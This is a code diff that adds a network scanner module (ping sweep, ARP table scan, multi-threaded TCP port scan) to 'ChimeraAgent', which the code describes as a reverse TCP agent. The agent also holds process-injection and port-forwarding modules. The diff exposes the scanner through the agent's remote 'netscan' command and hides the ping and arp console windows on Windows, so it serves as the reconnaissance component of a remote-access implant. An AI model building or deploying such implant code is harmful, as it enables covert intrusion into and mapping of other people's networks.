@@ -880,6 +880,343 @@ class PortForwarder:
         return f"[+] {len(ids)} tünel durduruldu."
 
 
+# ============================================================
+# Network Scanner (Ağ Tarama) Modülü
+# ============================================================
+class NetworkScanner:
+    """İç ağ keşfi için düz tarayıcı.
+
+    Desteklenen tarama türleri:
+      - Ping Sweep  : ICMP/TCP ile aktif host tespiti.
+      - ARP Scan    : Layer 2 ARP tablosu ile cihaz keşfi.
+      - Port Scan   : TCP connect ile port taraması (aralık bazlı).
+
+    Tüm taramalar multi-threaded çalışır; ek kütüphane gerektirmez.
+    """
+
+    # ── Yardımcı: CIDR → IP listesi ─────────────────────────────
+    @staticmethod
+    def _cidr_to_ips(cidr: str) -> list:
+        """CIDR notasyonunu IP listesine çevirir.
+
+        Desteklenen formatlar:
+          - 192.168.1.0/24
+          - 10.0.0.0/16  (büyük ağlarda 1024 host ile sınırlanır)
+          - 192.168.1.1   (tek IP)
+        """
+        if "/" not in cidr:
+            return [cidr]
+
+        parts = cidr.split("/")
+        base_ip = parts[0]
+        try:
+            prefix = int(parts[1])
+        except ValueError:
+            return [base_ip]
+
+        octets = list(map(int, base_ip.split(".")))
+        ip_int = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
+
+        mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
+        network = ip_int & mask
+        broadcast = network | (~mask & 0xFFFFFFFF)
+
+        # Güvenlik: çok büyük ağları sınırla
+        host_count = broadcast - network - 1
+        if host_count > 1024:
+            broadcast = network + 1025
+
+        ips = []
+        for addr in range(network + 1, broadcast):
+            ips.append(
+                f"{(addr >> 24) & 0xFF}."
+                f"{(addr >> 16) & 0xFF}."
+                f"{(addr >> 8) & 0xFF}."
+                f"{addr & 0xFF}"
+            )
+        return ips
+
+    # ── Yardımcı: Port aralığı parse ────────────────────────────
+    @staticmethod
+    def _parse_ports(port_str: str) -> list:
+        """Port string'ini listeye çevirir.
+
+        Desteklenen formatlar:
+          - '80'          → [80]
+          - '22,80,443'   → [22, 80, 443]
+          - '1-1024'      → [1, 2, ..., 1024]
+          - '22,80,100-200,443' → karışık
+        """
+        ports = []
+        for part in port_str.split(","):
+            part = part.strip()
+            if "-" in part:
+                try:
+                    start, end = part.split("-", 1)
+                    start, end = int(start), int(end)
+                    if start > end:
+                        start, end = end, start
+                    # Güvenlik: tek seferde en fazla 10000 port
+                    if (end - start) > 10000:
+                        end = start + 10000
+                    ports.extend(range(start, end + 1))
+                except ValueError:
+                    pass
+            else:
+                try:
+                    ports.append(int(part))
+                except ValueError:
+                    pass
+        return sorted(set(ports))
+
+    # ── Tek IP Ping (subprocess) ─────────────────────────────────
+    @staticmethod
+    def _ping_host(ip: str, timeout: int = 1) -> bool:
+        """ICMP ping ile host erişilebilirliğini kontrol eder."""
+        try:
+            param = "-n" if sys.platform == "win32" else "-c"
+            t_param = "-w" if sys.platform == "win32" else "-W"
+            t_val = str(timeout * 1000) if sys.platform == "win32" else str(timeout)
+
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0
+
+            result = subprocess.run(
+                ["ping", param, "1", t_param, t_val, ip],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                startupinfo=startupinfo,
+                timeout=timeout + 2,
+            )
+            return result.returncode == 0
+        except Exception:
+            return False
+
+    # ── TCP Connect ile host keşfi ──────────────────────────────
+    @staticmethod
+    def _tcp_probe(ip: str, port: int = 445, timeout: float = 0.5) -> bool:
+        """TCP connect ile hostun ayakta olup olmadığını kontrol eder."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            result = s.connect_ex((ip, port))
+            s.close()
+            return result == 0 or result in (111, 10061)
+        except Exception:
+            return False
+
+    # ── Ping Sweep ──────────────────────────────────────────────
+    def ping_sweep(self, cidr: str, timeout: int = 1, max_threads: int = 50) -> str:
+        """CIDR bloğundaki aktif hostları tespit eder.
+
+        Önce ICMP ping dener, cevap gelmezse TCP/445 probe yapar.
+
+        Args:
+            cidr       : Hedef ağ (örn: 192.168.1.0/24)
+            timeout    : Ping timeout (saniye)
+            max_threads: Eş zamanlı thread sayısı
+
+        Returns:
+            str: Formatlanmış sonuç
+        """
+        ips = self._cidr_to_ips(cidr)
+        alive = []
+        lock = threading.Lock()
+
+        def _worker(ip):
+            if self._ping_host(ip, timeout):
+                with lock:
+                    alive.append((ip, "ICMP"))
+            elif self._tcp_probe(ip):
+                with lock:
+                    alive.append((ip, "TCP"))
+
+        threads = []
+        for ip in ips:
+            while len([t for t in threads if t.is_alive()]) >= max_threads:
+                time.sleep(0.05)
+            t = threading.Thread(target=_worker, args=(ip,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        for t in threads:
+            t.join(timeout=timeout + 5)
+
+        if not alive:
+            return f"[-] Ping Sweep: {cidr} → Aktif host bulunamadı ({len(ips)} IP tarandı)."
+
+        alive.sort(key=lambda x: list(map(int, x[0].split("."))))
+        output = f"[+] Ping Sweep: {cidr} — {len(alive)}/{len(ips)} host aktif\n"
+        output += "-" * 35 + "\n"
+        for i, (ip, method) in enumerate(alive, 1):
+            output += f"  {i:3d}. {ip:<16s} ({method})\n"
+        output += "-" * 35
+        return output
+
+    # ── ARP Scan (Layer 2) ──────────────────────────────────────
+    def arp_scan(self, cidr: str) -> str:
+        """ARP tablosunu okuyarak yerel ağdaki cihazları listeler.
+
+        Önce broadcast ping ile ARP tablosunun dolmasını sağlar,
+        sonra 'arp -a' çıktısını parse eder.
+        """
+        # Ağı uyandır
+        try:
+            if sys.platform != "win32":
+                parts = cidr.split("/") if "/" in cidr else [cidr, "24"]
+                octets = parts[0].split(".")
+                broadcast = f"{octets[0]}.{octets[1]}.{octets[2]}.255"
+                subprocess.run(
+                    ["ping", "-c", "1", "-W", "1", "-b", broadcast],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3,
+                )
+            else:
+                ips = self._cidr_to_ips(cidr)
+                for ip in ips[:20]:
+                    try:
+                        subprocess.run(
+                            ["ping", "-n", "1", "-w", "200", ip],
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2,
+                        )
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+
+        # ARP tablosunu oku
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0
+
+            result = subprocess.run(
+                ["arp", "-a"],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                startupinfo=startupinfo, timeout=10,
+            )
+
+            try:
+                arp_output = result.stdout.decode("cp1254") if sys.platform == "win32" else result.stdout.decode("utf-8")
+            except Exception:
+                arp_output = result.stdout.decode("utf-8", errors="ignore")
+
+            if not arp_output.strip():
+                return "[-] ARP tablosu boş veya okunamadı."
+
+            entries = []
+            for line in arp_output.strip().split("\n"):
+                line = line.strip()
+                if not line:
+                    continue
+
+                ip = None
+                mac = None
+
+                if sys.platform == "win32":
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        candidate = parts[0]
+                        if candidate.count(".") == 3:
+                            try:
+                                list(map(int, candidate.split(".")))
+                                ip = candidate
+                                mac = parts[1]
+                            except ValueError:
+                                pass
+                else:
+                    if "(" in line and ")" in line:
+                        try:
+                            ip = line.split("(")[1].split(")")[0]
+                            if " at " in line:
+                                mac = line.split(" at ")[1].split()[0]
+                            else:
+                                mac = "??"
+                        except (IndexError, ValueError):
+                            pass
+
+                if ip and mac and mac.lower() not in ("(incomplete)", "<incomplete>", "ff:ff:ff:ff:ff:ff"):
+                    entries.append((ip, mac))
+
+            if not entries:
+                return "[-] ARP tablosunda geçerli giriş bulunamadı."
+
+            entries.sort(key=lambda x: list(map(int, x[0].split("."))))
+            output = f"[+] ARP Scan: {len(entries)} cihaz bulundu\n"
+            output += f"{'#':>4s}  {'IP Adresi':<16s}  {'MAC Adresi':<20s}\n"
+            output += "-" * 44 + "\n"
+            for i, (ip, mac) in enumerate(entries, 1):
+                output += f"{i:4d}  {ip:<16s}  {mac:<20s}\n"
+            output += "-" * 44
+            return output
+
+        except subprocess.TimeoutExpired:
+            return "[!] ARP tablosu okuma zaman aşımı."
+        except Exception as e:
+            return f"[!] ARP scan hatası: {str(e)}"
+
+    # ── Port Scan (TCP Connect) ─────────────────────────────────
+    def port_scan(self, host: str, port_range: str = "1-1024",
+                  timeout: float = 0.5, max_threads: int = 200) -> str:
+        """Hedef host üzerinde TCP port taraması yapar.
+
+        Sadece açık portları raporlar. Servis ismi tahmini yapmaz.
+
+        Args:
+            host       : Hedef IP/hostname
+            port_range : Port aralığı string (örn: '1-1024', '22,80,443', '1-65535')
+            timeout    : Bağlantı timeout (saniye)
+            max_threads: Eş zamanlı thread sayısı
+
+        Returns:
+            str: Açık portların listesi
+        """
+        ports = self._parse_ports(port_range)
+        if not ports:
+            return "[!] Geçersiz port aralığı."
+
+        open_ports = []
+        lock = threading.Lock()
+
+        def _scan(port):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                result = s.connect_ex((host, port))
+                s.close()
+                if result == 0:
+                    with lock:
+                        open_ports.append(port)
+            except Exception:
+                pass
+
+        threads = []
+        for port in ports:
+            while len([t for t in threads if t.is_alive()]) >= max_threads:
+                time.sleep(0.01)
+            t = threading.Thread(target=_scan, args=(port,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        for t in threads:
+            t.join(timeout=timeout + 3)
+
+        if not open_ports:
+            return f"[-] Port Scan: {host} → Açık port yok ({len(ports)} port tarandı)."
+
+        open_ports.sort()
+        output = f"[+] Port Scan: {host} — {len(open_ports)} açık port ({len(ports)} tarandı)\n"
+        output += "-" * 30 + "\n"
+        for port in open_ports:
+            output += f"  {port}/tcp  açık\n"
+        output += "-" * 30
+        return output
+
+
 class ChimeraAgent:
 
     """Chimera Core Agent - Temel reverse TCP ajanı."""
@@ -894,6 +1231,7 @@ class ChimeraAgent:
         self.clipboard      = ClipboardManager()    # Clipboard modülü
         self.injector       = ProcessInjector()     # Process Injection modülü
         self.port_forwarder = PortForwarder()       # Port Forwarding modülü
+        self.net_scanner    = NetworkScanner()      # Network Scanner modülü
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -2297,6 +2635,56 @@ class ChimeraAgent:
                 return f"[!] Geçersiz parametre formatı: {e}"
             except Exception as e:
                 return f"[!] Port forwarding hatası: {e}"
+
+        # ── Network Scanner (Faz 6.2) ─────────────────────────────
+        if cmd_lower.startswith("netscan "):
+            try:
+                ns_parts = cmd.strip().split()
+                sub_cmd  = ns_parts[1].lower() if len(ns_parts) > 1 else ""
+
+                if sub_cmd == "sweep":
+                    # netscan sweep <CIDR> [timeout]
+                    if len(ns_parts) < 3:
+                        return "[!] Kullanım: netscan sweep <CIDR> [timeout]\n    Örnek: netscan sweep 192.168.1.0/24"
+                    cidr = ns_parts[2]
+                    timeout = int(ns_parts[3]) if len(ns_parts) > 3 else 1
+                    return self.net_scanner.ping_sweep(cidr, timeout=timeout)
+
+                elif sub_cmd == "arp":
+                    # netscan arp [CIDR]
+                    cidr = ns_parts[2] if len(ns_parts) > 2 else "0.0.0.0/0"
+                    return self.net_scanner.arp_scan(cidr)
+
+                elif sub_cmd == "ports":
+                    # netscan ports <HOST> [port_aralığı] [timeout]
+                    # Örnekler:
+                    #   netscan ports 192.168.1.1
+                    #   netscan ports 192.168.1.1 1-1024
+                    #   netscan ports 192.168.1.1 22,80,443,3389
+                    #   netscan ports 192.168.1.1 1-65535 0.3
+                    if len(ns_parts) < 3:
+                        return (
+                            "[!] Kullanım: netscan ports <HOST> [port_aralığı] [timeout]\n"
+                            "    Örnek: netscan ports 192.168.1.1\n"
+                            "    Örnek: netscan ports 192.168.1.1 1-1024\n"
+                            "    Örnek: netscan ports 192.168.1.1 22,80,443,3389"
+                        )
+                    host = ns_parts[2]
+                    port_range = ns_parts[3] if len(ns_parts) > 3 else "1-1024"
+                    timeout = float(ns_parts[4]) if len(ns_parts) > 4 else 0.5
+                    return self.net_scanner.port_scan(host, port_range=port_range, timeout=timeout)
+
+                else:
+                    return (
+                        "[!] Geçersiz alt komut. Kullanım:\n"
+                        "    netscan sweep <CIDR> [timeout]       - Ping sweep (host keşfi)\n"
+                        "    netscan arp [CIDR]                   - ARP tablosu taraması\n"
+                        "    netscan ports <HOST> [aralık] [timeout] - TCP port taraması"
+                    )
+            except ValueError as e:
+                return f"[!] Geçersiz parametre: {e}"
+            except Exception as e:
+                return f"[!] Network scan hatası: {e}"
 
         # Özel komutlar - Shell
         if cmd_lower == "shell":
